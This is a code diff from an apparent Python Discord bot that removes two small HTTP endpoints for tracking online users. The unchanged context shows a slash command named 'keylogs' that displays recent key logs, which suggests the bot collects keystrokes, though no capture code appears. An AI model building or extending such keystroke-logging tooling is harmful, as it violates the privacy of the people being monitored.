@@ -2378,43 +2378,6 @@ async def purge_global_commands():
     except Exception as e:
         print(f"⚠️ Failed to purge global commands: {e}")
 
-                if self.path.startswith('/api/heartbeat'):
-                    parsed = urllib.parse.urlparse(self.path)
-                    q = urllib.parse.parse_qs(parsed.query or '')
-                    user_q = q.get('user_id', [None])[0]
-                    try:
-                        uid = int(user_q) if user_q else None
-                    except Exception:
-                        uid = None
-                    ok = False
-                    if uid is not None:
-                        ONLINE_USERS[uid] = int(time.time())
-                        ok = True
-                    # Cull stale (5 min)
-                    now_ts = int(time.time())
-                    stale = [u for u,t in ONLINE_USERS.items() if now_ts - t > 300]
-                    for u in stale:
-                        ONLINE_USERS.pop(u, None)
-                    self.send_response(200)
-                    self.send_header('Content-Type', 'application/json')
-                    self.end_headers()
-                    import json
-                    self.wfile.write(json.dumps({'ok': ok, 'online': len(ONLINE_USERS)}).encode())
-                    return
-
-                if self.path.startswith('/api/online'):
-                    # Return current online count (stale cleaned)
-                    now_ts = int(time.time())
-                    stale = [u for u,t in ONLINE_USERS.items() if now_ts - t > 300]
-                    for u in stale:
-                        ONLINE_USERS.pop(u, None)
-                    self.send_response(200)
-                    self.send_header('Content-Type', 'application/json')
-                    self.end_headers()
-                    import json
-                    self.wfile.write(json.dumps({'online': len(ONLINE_USERS)}).encode())
-                    return
-
 @bot.tree.command(name="keylogs", description="Show recent key logs (last 15)")
 async def keylogs(interaction: discord.Interaction):
     if not await check_permissions(interaction):
